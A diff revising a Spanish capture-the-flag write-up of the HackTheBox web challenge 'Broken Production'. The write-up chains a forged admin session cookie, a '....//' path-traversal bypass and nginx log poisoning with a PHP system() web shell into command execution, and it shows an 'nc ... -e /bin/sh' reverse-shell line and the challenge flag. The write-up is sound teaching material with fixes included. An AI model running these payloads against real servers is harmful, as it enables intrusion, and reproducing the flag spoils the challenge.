@@ -16,7 +16,7 @@ estado: resuelto
 ## 0. Cómo estudiar este documento
 
 1. Lee la sección 3 (mentalidad de pentest de caja blanca): es la que se reutiliza en cualquier reto con código fuente.
-2. Seguro cada fase tiene: el código que se leyó, las preguntas que había que hacerse, la prueba realizada con su resultado real, y la lectura.
+2. Cada fase incluye: el código que se leyó, las preguntas que había que hacerse, la prueba realizada con su resultado real, y la lectura.
 3. Haz la autoevaluación (sección 13) sin mirar las respuestas.
 4. Repite el razonamiento completo tapando las respuestas, solo con el código fuente delante.
 
@@ -38,7 +38,7 @@ Flag: `HTB{br0k3n_au7hs_p0i50n3d_l0gs}` — el propio nombre resume el reto: *br
 
 > **Broken Production.** Nuestros desarrolladores de PHP están trabajando en este portal de gestión de empleados. Tenemos una build simulada de la web y hay que hacerle un pentest para encontrar debilidades. El objetivo es conseguir más privilegios y ejecución de comandos en el servidor.
 
-- Objetivo: `154.57.164.80:37105` (contenedor Docker expuesto).
+- Objetivo: la instancia del reto expuesta por la plataforma (contenedor Docker), en adelante `<TARGET>` en los comandos.
 - Material adicional: el **código fuente completo** de la aplicación (`web_broken_prod/`), con el Dockerfile y la configuración de nginx y PHP-FPM.
 - Objetivos explícitos: (1) escalada de privilegios, (2) ejecución de comandos.
 
@@ -58,7 +58,8 @@ challenge/
     ├── index.php            <- decide admin.php vs user.php
     ├── admin.php             <- panel de admin (AQUÍ el segundo fallo)
     ├── login.php
-    └── register.php
+    ├── register.php
+    └── user.php              <- panel de usuario normal (incluido desde index.php)
 config/
 ├── nginx.conf                <- AQUÍ la pista del tercer fallo
 ├── fpm.conf
@@ -93,7 +94,7 @@ Si la respuesta a la 1 es "del cliente" y a la 2 es "no" o "un filtro débil", t
 
 ### 3.3 Descarta con evidencia, no con intuición
 
-En este reto se descartó una hipótesis real (LFI a través de `Router::view()`) leyendo el código y comprobando que **ningún** sitio pasaba datos del usuario a esa función. No se descartó "porque no se veía nada raro a simple vista": se verificó mirando **todas** las llamadas.
+En este reto se planteó una hipótesis de LFI a través de `Router::view()`, que se descartó leyendo el código y comprobando que **ningún** sitio pasaba datos del usuario a esa función. No se descartó "porque no se veía nada raro a simple vista": se verificó mirando **todas** las llamadas.
 
 ### 3.4 Un filtro de seguridad hay que probarlo, no fiarse de su nombre
 
@@ -113,23 +114,19 @@ El pentest real es encontrar cómo **se encadenan**.
 
 ## 4. Fase 1: Reconocimiento — la pantalla de login
 
-![[01-login-page.png]]
-
-*Captura 1: formulario con usuario y contraseña, enlace a "Create your Account".*
+![Formulario de login con usuario y contraseña, enlace a "Create your Account"](assets/web-broken-production/01-login-page.png)
 
 ### Qué se probó
 
-Credenciales por defecto / comunes en el formulario. Ninguna funcionó.
+Credenciales por defecto y combinaciones comunes (`admin/admin`, `admin/password`, variantes del nombre del reto) en el formulario. Ninguna funcionó.
 
 ### Qué se observó
 
-![[02-url-msg-param.png]]
-
-*Captura 2: `http://154.57.164.80:37105/login?msg=Invalid username or password!`*
+![URL tras un login fallido: /login?msg=Invalid username or password!](assets/web-broken-production/02-url-msg-param.png)
 
 ### Lectura
 
-Un parámetro `msg` reflejado en la URL tras un fallo de login es un **candidato clásico a XSS reflejado**. Se investigó mirando el código fuente de la página de login: el texto "Invalid username or password!" **no aparece en el HTML** de `views/login.php` (solo hay un `<p>` fijo oculto con "Successful login!"). Conclusión: si ese `msg` se muestra en algún sitio, es **JavaScript** (`main.js`) quien lo lee de `location.search`, no el servidor quien lo imprime directamente. No se llegó a profundizar en esta vía porque apareció un camino más directo y de mayor impacto (ver fase 2); queda anotada como pendiente en la sección 12.
+Un parámetro `msg` reflejado en la URL tras un fallo de login es un **candidato clásico a XSS reflejado**. Se investigó mirando el código fuente de la página de login: el texto "Invalid username or password!" **no aparece en el HTML** de `views/login.php` (solo hay un `<p>` fijo oculto con "Successful login!"). Hipótesis de trabajo: si ese `msg` se muestra en algún sitio, probablemente sea `main.js` quien lo lee de `location.search`, no el servidor quien lo imprime directamente; esto no se llegó a comprobar leyendo `main.js`. No se profundizó en esta vía porque apareció un camino más directo y de mayor impacto (ver fase 2); queda anotada como pendiente en la sección 12.
 
 ---
 
@@ -148,6 +145,8 @@ public function view($view, $data = [])
 
 **La pregunta clave:** ¿de dónde sale `$view`? Si viniera de datos del usuario, sería un LFI inmediato.
 
+(Nota de versión: la interpolación `${view}` dentro de la cadena está obsoleta desde PHP 8.2; en una versión más reciente de PHP este código daría un *warning* de obsolescencia, aunque seguiría funcionando igual en esta ejecución.)
+
 ### 5.2 `index.php`: dónde se llama a `view()`
 
 ```php
@@ -156,7 +155,7 @@ $router->view('login');
 $router->view('register');
 ```
 
-**Lectura:** las tres llamadas usan **textos fijos** (`'index'`, `'login'`, `'register'`), nunca una variable que dependa de la petición. **Descartado con evidencia**: este `include` no es explotable, aunque la función en sí sea peligrosa en abstracto. Buen ejemplo de que una función "peligrosa" no es automáticamente una vulnerabilidad: depende de cómo se la llame en **todo** el código, no en un sitio aislado.
+**Lectura:** las tres llamadas usan **textos fijos** (`'index'`, `'login'`, `'register'`), nunca una variable que dependa de la petición. **Descartado con evidencia**: este `include` no es explotable, aunque la función en sí sea peligrosa en abstracto. Una función "peligrosa" no es automáticamente una vulnerabilidad: depende de cómo se la llame en **todo** el código, no en un sitio aislado.
 
 ### 5.3 `SessionHandler.php`: aquí está el primer fallo
 
@@ -204,17 +203,11 @@ eyJ1c2VybmFtZSI6ImFkbWluIn0=
 
 ### La prueba
 
-![[03-cookie-editor-admin-panel.png]]
+![Extensión Cookie-Editor usada para inyectar la cookie manualmente, sin pasar por el formulario de login](assets/web-broken-production/03-cookie-editor-admin-panel.png)
 
-*Captura 3: la extensión Cookie-Editor usada para inyectar la cookie manualmente, sin pasar por el formulario de login.*
+![El valor de PHPSESSID coincide exactamente con el base64 calculado a mano](assets/web-broken-production/04-cookie-value-forged.png)
 
-![[04-cookie-value-forged.png]]
-
-*Captura 4: el valor de `PHPSESSID` coincide exactamente con el base64 calculado a mano.*
-
-![[05-admin-panel-access.png]]
-
-*Captura 5: "ADMIN DASHBOARD (UNDER CONSTRUCTION)", usuario `admin`, rol "ADMINISTRATOR".*
+![ADMIN DASHBOARD (UNDER CONSTRUCTION), usuario admin, rol ADMINISTRATOR](assets/web-broken-production/05-admin-panel-access.png)
 
 ### Confirmación con el código
 
@@ -229,7 +222,7 @@ eyJ1c2VybmFtZSI6ImFkbWluIn0=
 ?>
 ```
 
-El booleano `$admin` viene directo de `$session->isAdmin()`, que a su vez viene de tu cookie. **Cadena completa demostrada**, no solo sospechada:
+El booleano `$admin` viene directo de `$session->isAdmin()`, que a su vez viene de tu cookie. Las capturas confirman que esto se cumple en la instancia real, y el código muestra exactamente por qué:
 
 ```
 cookie fabricada sin login
@@ -268,7 +261,7 @@ if (isset($_GET['util']))
 	$utilFile = str_replace("../","", $utilFile);   // <- esta se ejecuta SIEMPRE
 ```
 
-En este caso concreto no cambia el resultado (si no hay `util`, `$utilFile` sigue siendo `"tickets.php"` y el `str_replace` sobre ese texto no hace nada), pero es el tipo de fallo de indentación que, en otro contexto, sí cambiaría el comportamiento. Vale la pena entrenar el ojo para detectarlo.
+En este caso concreto no cambia el resultado (si no hay `util`, `$utilFile` sigue siendo `"tickets.php"` y el `str_replace` sobre ese texto no hace nada), pero es el tipo de fallo de indentación que, en otro contexto, sí cambiaría el comportamiento. Es un error de indentación/lógica, no solo una cuestión de estilo, y vale la pena entrenar el ojo para detectarlo.
 
 ### Las dos preguntas de siempre
 
@@ -291,16 +284,14 @@ Busca la subcadena `../` (punto, punto, barra) dentro de eso. Está en los índi
 ### La prueba
 
 ```
-http://154.57.164.80:37105/?util=....//....//....//....//etc/passwd
+http://<TARGET>/?util=....//....//....//....//etc/passwd
 ```
 
-![[06-lfi-etc-passwd.png]]
-
-*Captura 6: `root:x:0:0:root:/root:/bin/ash`, `www:x:1000:1000:1000:/home/www:/bin/sh`, `nginx:x:100:101:...`, listado completo de usuarios del sistema.*
+![Contenido de /etc/passwd: root:x:0:0:root:/root:/bin/ash, www:x:1000:1000:1000:/home/www:/bin/sh, nginx:x:100:101:..., listado completo de usuarios del sistema](assets/web-broken-production/06-lfi-etc-passwd.png)
 
 **Lectura de un dato importante de esa salida:** el shell de `root` es `/bin/ash` (BusyBox/Alpine), no `/bin/bash`. Esto importa para más adelante: muchos *one-liners* de Internet para reverse shells asumen `bash` y no funcionan tal cual aquí.
 
-**Resultado:** lectura de ficheros arbitrarios en el sistema, fuera por completo de la carpeta `/www/utils/` a la que debería estar limitado (**CWE-22, Path Traversal**, que habilita un **LFI, CWE-98**).
+**Resultado:** lectura de ficheros arbitrarios en el sistema, fuera por completo de la carpeta `/www/utils/` a la que debería estar limitado (**CWE-22, Path Traversal**, que habilita un **LFI, CWE-98**). Esto se confirmó para rutas como `/etc/passwd` y, más adelante, el log de nginx; no se verificó si existe algún límite adicional (`open_basedir` u otro) para rutas fuera de esas.
 
 ---
 
@@ -334,7 +325,7 @@ Encadena tres hechos ya confirmados:
 
 1. `include()` en PHP no es "mostrar un fichero": si encuentra `<?php ... ?>` dentro, lo **ejecuta**.
 2. El log de acceso es un fichero de texto en disco cuyo contenido **tú controlas parcialmente** (el User-Agent es tuyo).
-3. Ya tienes un LFI que incluye **cualquier ruta**, incluido ese log.
+3. Ya se demostró que el LFI llega hasta rutas arbitrarias del sistema (sección 7), incluido ese log.
 
 Conclusión: si metes `<?php ... ?>` en tu User-Agent, queda escrito en el log, y si luego incluyes ese log con el LFI, PHP ejecuta tu código.
 
@@ -343,19 +334,17 @@ Conclusión: si metes `<?php ... ?>` en tu User-Agent, queda escrito en el log, 
 **Paso A — envenenar el log:**
 
 ```bash
-curl -A "<?php echo 'TEST_LOG_POISON_OK'; ?>" "http://154.57.164.80:37105/" \
+curl -A "<?php echo 'TEST_LOG_POISON_OK'; ?>" "http://<TARGET>/" \
   -H "Cookie: PHPSESSID=eyJ1c2VybmFtZSI6ImFkbWluIn0="
 ```
 
 **Paso B — incluir el log envenenado:**
 
 ```
-http://154.57.164.80:37105/?util=....//....//....//....//var/log/nginx/access.log
+http://<TARGET>/?util=....//....//....//....//var/log/nginx/access.log
 ```
 
-![[07-log-poison-test-ok.png]]
-
-*Captura 7: en vez de ver `<?php echo 'TEST_LOG_POISON_OK'; ?>` como texto, se ve directamente `TEST_LOG_POISON_OK` en el hueco donde debería estar el User-Agent. El código se ejecutó.*
+![En vez de ver <?php echo 'TEST_LOG_POISON_OK'; ?> como texto, se ve directamente TEST_LOG_POISON_OK en el hueco donde debería estar el User-Agent: el código se ejecutó](assets/web-broken-production/07-log-poison-test-ok.png)
 
 ### Prueba 2: ejecución de comandos real
 
@@ -364,21 +353,19 @@ Se cambia `echo` por una función que ejecute comandos del sistema, parametrizad
 **Paso A:**
 
 ```bash
-curl -A "<?php system(\$_GET['cmd']); ?>" "http://154.57.164.80:37105/" \
+curl -A "<?php system(\$_GET['cmd']); ?>" "http://<TARGET>/" \
   -H "Cookie: PHPSESSID=eyJ1c2VybmFtZSI6ImFkbWluIn0="
 ```
 
-(El `\$` escapa el signo dólar para que sea bash quien no lo interprete como variable propia antes de mandarlo.)
+(El `\$` es un escape de *shell*: evita que bash expanda `$_GET['cmd']` como si fuera una variable propia antes de mandarlo en la petición; lo que llega al servidor es el signo `$` literal, para que sea PHP quien lo interprete.)
 
 **Paso B**, con `cmd` en la misma URL que hace el `include`:
 
 ```
-http://154.57.164.80:37105/?util=....//....//....//....//var/log/nginx/access.log&cmd=id
+http://<TARGET>/?util=....//....//....//....//var/log/nginx/access.log&cmd=id
 ```
 
-![[08-log-poison-rce-id.png]]
-
-*Captura 8: `uid=1000(www) gid=1000(www) groups=1000(www)` en el hueco del User-Agent.*
+![uid=1000(www) gid=1000(www) groups=1000(www) en el hueco del User-Agent](assets/web-broken-production/08-log-poison-rce-id.png)
 
 **Segundo objetivo del enunciado, cumplido: ejecución de comandos en el servidor**, con el usuario `www` (coincide con lo que ya se sabía por `nginx.conf` y `fpm.conf`).
 
@@ -400,7 +387,7 @@ cmd=nc%20TU_IP%204444%20-e%20/bin/sh
 
 ### Por qué no se hizo
 
-**Pregunta de verificación, antes de perder tiempo:** una reverse shell exige que el servidor pueda **iniciar una conexión saliente** hacia la IP del atacante. Eso solo funciona si hay una ruta de red entre ambos (por ejemplo, estando conectado a la VPN del CTF). En este caso, **no había conexión VPN activa**, así que no existía ninguna IP del jugador alcanzable desde el contenedor. Intentarlo habría sido un comando que se ejecuta en el servidor, abre una conexión, y se queda esperando una respuesta que nunca llega (timeout), sin ningún error que lo delatara como "mal hecho": simplemente no hay ruta.
+**Pregunta de verificación, antes de perder tiempo:** una reverse shell exige que el servidor pueda **iniciar una conexión saliente** hacia la IP del atacante. Eso solo funciona si hay una ruta de red entre ambos (por ejemplo, estando conectado a la VPN del CTF). En este caso, **no había conexión VPN activa**, así que no existía ninguna IP del jugador alcanzable desde el contenedor. El riesgo de intentarlo sin esa ruta era que el comando se ejecutara igualmente en el servidor, abriera una conexión que no llega a nadie y se quedara esperando sin devolver ningún error que avisara de que el problema era de red y no de sintaxis.
 
 ### La lección
 
@@ -427,7 +414,7 @@ Primero se intentó una búsqueda genérica:
 cmd=find%20/%20-iname%20%22*flag*%22%20-not%20-path%20%22/proc/*%22%202%3E/dev/null
 ```
 
-Esto devolvió, entre otros, un fichero `/flag_08bd4f2e9753d32.txt`, mezclado con **falsos positivos** del propio kernel Linux (rutas de `/sys/devices/.../flags`, que no tienen nada que ver con el reto: "flags" ahí es un término genérico de atributos de hardware, no una flag de CTF). **Lección:** una búsqueda amplia por nombre trae ruido; hay que filtrar los resultados con sentido, no tomar el primero que aparece.
+Esto devolvió, entre otros, un fichero cuyo nombre contenía "flag", mezclado con **falsos positivos** del propio kernel Linux (rutas de `/sys/devices/.../flags`, que no tienen nada que ver con el reto: "flags" ahí es un término genérico de atributos de hardware, no una flag de CTF). **Lección:** una búsqueda amplia por nombre trae ruido; hay que filtrar los resultados con sentido, no tomar el primero que aparece.
 
 ### El camino real: el bot de verificación
 
@@ -437,11 +424,11 @@ Tras demostrar la ejecución de comandos (la prueba de `id`), apareció **sin qu
 "GET / HTTP/1.1" "-" "HTB{br0k3n_au7hs_p0i50n3d_l0gs} "
 ```
 
-**Interpretación:** el reto tiene, con toda probabilidad, un proceso automático que visita la web periódicamente y, al detectar que la explotación tuvo éxito, entrega la flag dejándola como `User-Agent` en una petición propia. Es un mecanismo de entrega distinto a los otros dos retos (donde la flag estaba en un fichero fijo): aquí la flag **aparece como consecuencia de haber demostrado el impacto**, no como un fichero que hay que buscar.
+**Interpretación:** todo apunta a que el reto tiene un proceso automático que visita la web periódicamente y, al detectar que la explotación tuvo éxito, entrega la flag dejándola como `User-Agent` en una petición propia; no se llegó a confirmar el mecanismo exacto más allá de observar esta línea. Es una entrega distinta a la de otros retos de esta misma serie, donde la flag estaba en un fichero fijo: aquí la flag **aparece como consecuencia de haber demostrado el impacto**, no como un fichero que hay que buscar.
 
 ### Una lección de método, no solo de contenido
 
-Al buscar la flag dentro del log incluido en el navegador, se esperaba encontrarla en la **última línea** (por costumbre de los dos retos anteriores). Pero el log es cronológico y el bot pudo escribir su línea en cualquier momento, **en mitad** del fichero. La forma correcta de buscar fue `Ctrl+F` → `HTB{`, es decir, **buscar por contenido, no por posición esperada**.
+Al buscar la flag dentro del log incluido en el navegador, se esperaba encontrarla al final, por costumbre de cómo se entregaba en otros retos. Pero el log es cronológico y el bot pudo escribir su línea en cualquier momento, **en mitad** del fichero: de hecho apareció antes del final, no en la última línea. La forma correcta de buscar fue `Ctrl+F` → `HTB{`, es decir, **buscar por contenido, no por posición esperada**.
 
 ---
 
@@ -468,8 +455,8 @@ Al buscar la flag dentro del log incluido en el navegador, se esperaba encontrar
 | Cookie sin firmar | Usar las sesiones nativas de PHP (`session_start()`) o, si se necesita un token propio, firmarlo con `hash_hmac` y una clave secreta del servidor, verificando la firma en cada petición |
 | `isAdmin()` por comparación de texto | El rol debería consultarse en el servidor (base de datos), nunca derivarse de un dato que manda el cliente |
 | `include_once($fullPath)` con entrada de usuario | No incluir ficheros a partir de parámetros de usuario. Si es imprescindible, usar una **lista blanca** de valores permitidos (`in_array($utilFile, ['logs.php','tickets.php','todo.php'])`), no un filtro de "quitar patrones" |
-| Filtro `str_replace` no recursivo | Si se necesita sanear rutas, aplicar el filtro en bucle hasta que no haya cambios, o mejor, usar `basename()` y comparar contra una lista blanca |
-| Logs con datos de usuario sin sanitizar | Aceptable para lectura humana, pero **nunca deberían ser incluibles por la aplicación**; separar el directorio de logs del alcance de cualquier función de inclusión, y considerar deshabilitar la ejecución de PHP fuera del document root |
+| Filtro `str_replace` no recursivo | Es frágil incluso aplicado en bucle; mejor usar `basename()` y comparar contra una lista blanca directamente |
+| Logs con datos de usuario sin sanitizar | Aceptable para lectura humana, pero **nunca deberían ser incluibles por la aplicación**; separar el directorio de logs del alcance de cualquier función de inclusión, usar `open_basedir` para limitar qué puede leer PHP, y evitar que PHP pueda ejecutarse fuera del document root |
 | `clear_env = On` en PHP-FPM (detalle positivo) | Esto ya limita el acceso a variables de entorno del proceso; buena práctica a mantener |
 
 Pendiente de investigar (quedó fuera del alcance de este write-up): si el `msg=` de la fase 1 es explotable como XSS basado en DOM vía `main.js`. Ejercicio propuesto en la sección 13.
@@ -478,29 +465,53 @@ Pendiente de investigar (quedó fuera del alcance de este write-up): si el `msg=
 
 ## 13. Autoevaluación y ejercicios (responde sin mirar)
 
-> [!question]- 1. ¿Por qué `base64_encode` no protege la cookie de sesión?
-> Porque base64 es una codificación reversible por cualquiera, no un cifrado ni una firma. Cualquiera puede decodificarla, leerla, modificarla y volver a codificarla.
+<details>
+<summary>1. ¿Por qué <code>base64_encode</code> no protege la cookie de sesión?</summary>
 
-> [!question]- 2. ¿Qué habría hecho falta en `SessionHandler.php` para que la cookie no se pudiera fabricar?
-> Una firma criptográfica (por ejemplo `hash_hmac` con una clave secreta del servidor) verificada en cada `load()`, o usar las sesiones nativas de PHP, donde el identificador de sesión no contiene datos legibles ni modificables por el cliente, solo un puntero a datos guardados en el servidor.
+Porque base64 es una codificación reversible por cualquiera, no un cifrado ni una firma. Cualquiera puede decodificarla, leerla, modificarla y volver a codificarla.
+</details>
 
-> [!question]- 3. ¿Por qué se descartó el `include` del `Router.php` como vulnerable, y el de `views/admin.php` no?
-> Porque en `Router.php`, todas las llamadas a `view()` en `index.php` usan textos fijos, nunca datos del usuario. En `views/admin.php`, `$utilFile` sale directamente de `$_GET['util']`.
+<details>
+<summary>2. ¿Qué habría hecho falta en <code>SessionHandler.php</code> para que la cookie no se pudiera fabricar?</summary>
 
-> [!question]- 4. Explica con tus propias palabras por qué `....//` burla `str_replace("../","","....//")`.
-> Porque `str_replace` quita una sola aparición de `../` en una sola pasada. Dentro de `....//` hay una subcadena `../` (en el medio); al quitarla, los caracteres que quedan a los lados se recomponen formando de nuevo `../`.
+Una firma criptográfica (por ejemplo `hash_hmac` con una clave secreta del servidor) verificada en cada `load()`, o usar las sesiones nativas de PHP, donde el identificador de sesión no contiene datos legibles ni modificables por el cliente, solo un puntero a datos guardados en el servidor.
+</details>
 
-> [!question]- 5. ¿Por qué nginx y PHP-FPM corriendo como el mismo usuario (`www`) es relevante para el pentest?
-> Porque indica con qué privilegios se ejecutará cualquier comando que consigas correr mediante RCE: no serás root, serás `www`, un usuario sin privilegios especiales (según lo visto en `/etc/passwd`).
+<details>
+<summary>3. ¿Por qué se descartó el <code>include</code> del <code>Router.php</code> como vulnerable, y el de <code>views/admin.php</code> no?</summary>
 
-> [!question]- 6. ¿Qué dos cosas hacen falta para que el log poisoning funcione, y cuál se consiguió primero?
-> Hace falta (a) poder escribir contenido propio en un fichero del servidor (el User-Agent en el log) y (b) poder incluir ese fichero para que PHP lo ejecute (el LFI). El LFI se consiguió primero; sin él, poder "escribir" en el log no serviría de nada.
+Porque en `Router.php`, todas las llamadas a `view()` en `index.php` usan textos fijos, nunca datos del usuario. En `views/admin.php`, `$utilFile` sale directamente de `$_GET['util']`.
+</details>
 
-> [!question]- 7. ¿Por qué no se montó una reverse shell?
-> Porque no había conectividad de red (VPN) entre la máquina del atacante y el contenedor del reto; sin una IP alcanzable, el servidor no podría completar la conexión saliente.
+<details>
+<summary>4. Explica con tus propias palabras por qué <code>....//</code> burla <code>str_replace("../","","....//")</code>.</summary>
 
-> [!question]- 8. ¿Por qué buscar la flag con Ctrl+F fue mejor que leer el log de arriba a abajo?
-> Porque el log es muy largo y la flag no estaba en la posición esperada (el final); buscar por contenido exacto es más fiable que asumir dónde "debería" estar.
+Porque `str_replace` quita una sola aparición de `../` en una sola pasada. Dentro de `....//` hay una subcadena `../` (en el medio); al quitarla, los caracteres que quedan a los lados se recomponen formando de nuevo `../`.
+</details>
+
+<details>
+<summary>5. ¿Por qué nginx y PHP-FPM corriendo como el mismo usuario (<code>www</code>) es relevante para el pentest?</summary>
+
+Porque indica con qué privilegios se ejecutará cualquier comando que consigas correr mediante RCE: no sería `root`, sería `www`. El `/etc/passwd` leído con el LFI confirma que `www` es una cuenta de servicio normal, sin privilegios especiales visibles en ese fichero (aunque `/etc/passwd` por sí solo no certifica qué puede o no hacer ese usuario en el sistema).
+</details>
+
+<details>
+<summary>6. ¿Qué dos cosas hacen falta para que el log poisoning funcione, y cuál se consiguió primero?</summary>
+
+Hace falta (a) poder escribir contenido propio en un fichero del servidor (el User-Agent en el log) y (b) poder incluir ese fichero para que PHP lo ejecute (el LFI). El LFI se consiguió primero; sin él, poder "escribir" en el log no serviría de nada.
+</details>
+
+<details>
+<summary>7. ¿Por qué no se montó una reverse shell?</summary>
+
+Porque no había conectividad de red (VPN) entre la máquina del atacante y el contenedor del reto; sin una IP alcanzable, el servidor no podría completar la conexión saliente.
+</details>
+
+<details>
+<summary>8. ¿Por qué buscar la flag con Ctrl+F fue mejor que leer el log de arriba a abajo?</summary>
+
+Porque el log es muy largo y la flag no apareció donde se esperaba por costumbre de otros retos (al final); buscar por contenido exacto es más fiable que asumir dónde "debería" estar.
+</details>
 
 **Ejercicio pendiente (sin resolver en este documento):** investiga `main.js` para ver si el parámetro `msg` de la URL se inserta en el DOM sin sanitizar, lo que daría un XSS basado en DOM. Pista: busca si el script usa `location.search`, `URLSearchParams` o `innerHTML`.
 
@@ -543,23 +554,26 @@ echo -n '{"username":"admin"}' | base64
 
 # 2) Confirmar el LFI con bypass de filtro, leyendo /etc/passwd
 # (en el navegador, con la cookie de admin puesta)
-http://154.57.164.80:37105/?util=....//....//....//....//etc/passwd
+http://<TARGET>/?util=....//....//....//....//etc/passwd
 
 # 3) Prueba de log poisoning inofensiva
-curl -A "<?php echo 'TEST_LOG_POISON_OK'; ?>" "http://154.57.164.80:37105/" \
+curl -A "<?php echo 'TEST_LOG_POISON_OK'; ?>" "http://<TARGET>/" \
   -H "Cookie: PHPSESSID=eyJ1c2VybmFtZSI6ImFkbWluIn0="
 
-http://154.57.164.80:37105/?util=....//....//....//....//var/log/nginx/access.log
+http://<TARGET>/?util=....//....//....//....//var/log/nginx/access.log
 
 # 4) Log poisoning con ejecución de comandos real
-curl -A "<?php system(\$_GET['cmd']); ?>" "http://154.57.164.80:37105/" \
+curl -A "<?php system(\$_GET['cmd']); ?>" "http://<TARGET>/" \
   -H "Cookie: PHPSESSID=eyJ1c2VybmFtZSI6ImFkbWluIn0="
 
-http://154.57.164.80:37105/?util=....//....//....//....//var/log/nginx/access.log&cmd=id
+http://<TARGET>/?util=....//....//....//....//var/log/nginx/access.log&cmd=id
 
 # 5) Buscar la flag (ruta inicial, con falsos positivos)
-http://154.57.164.80:37105/?util=....//....//....//....//var/log/nginx/access.log&cmd=find%20/%20-iname%20%22*flag*%22%20-not%20-path%20%22/proc/*%22%202%3E/dev/null
+http://<TARGET>/?util=....//....//....//....//var/log/nginx/access.log&cmd=find%20/%20-iname%20%22*flag*%22%20-not%20-path%20%22/proc/*%22%202%3E/dev/null
+```
 
-# La flag real apareció sola en el log, entregada por un bot de verificación:
-# "HTB{br0k3n_au7hs_p0i50n3d_l0gs}"
+La flag real apareció sola en el log, entregada por lo que parece ser un bot de verificación de la plataforma:
+
+```
+HTB{br0k3n_au7hs_p0i50n3d_l0gs}
 ```
